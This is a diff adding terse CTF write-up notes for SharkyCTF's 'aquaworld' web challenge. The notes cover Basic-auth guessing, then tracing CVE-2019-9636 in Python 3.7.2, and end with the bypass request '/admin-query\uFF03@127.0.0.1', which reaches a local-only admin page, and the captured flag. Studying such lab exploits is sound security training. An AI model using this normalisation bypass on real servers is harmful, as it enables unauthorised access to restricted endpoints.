@@ -1,0 +1,26 @@
+source code to see admin query url
+we want http://aquaworld.sharkyctf.xyz/admin-query?flag=flag
+
+in anonymous -> Hi anonymous You need to connect locally in order to access the
+admin section (and get the flag) but you current netlocation is http://aquaworld.sharkyctf.xyz
+
+Authorization: Basic YW5vbnltb3VzOmFub255bW91cw==
+-> anonymous:anonymous
+
+admin:admin = YWRtaW46YWRtaW4K
+Authorization: Basic YWRtaW46YWRtaW4K -> 401 so wrong creds -> wrong path
+
+new hint: Server_info: Werkzeug/1.0.1 Python/3.7.2 and deprecated python version
+
+first -> https://www.cvedetails.com/vulnerability-list/vendor_id-10210/
+                    product_id-18230/version_id-285731/Python-Python-3.7.2.html
+
+then CTRL-F: netloc -> https://www.cvedetails.com/cve/CVE-2019-9636/
+
+then -> https://bugs.python.org/issue36216
+
+so tried GET /admin-query\uFF03@localhost -> netloc = locahost
+then GET /admin-query\uFF03@127.0.0.1 -> win
+finally GET /admin-query\uFF03@127.0.0.1?flag=flag
+
+shkCTF{NFKC_normalization_can_be_dangerous!_8471b9b2da83011a07efc2899819da65}
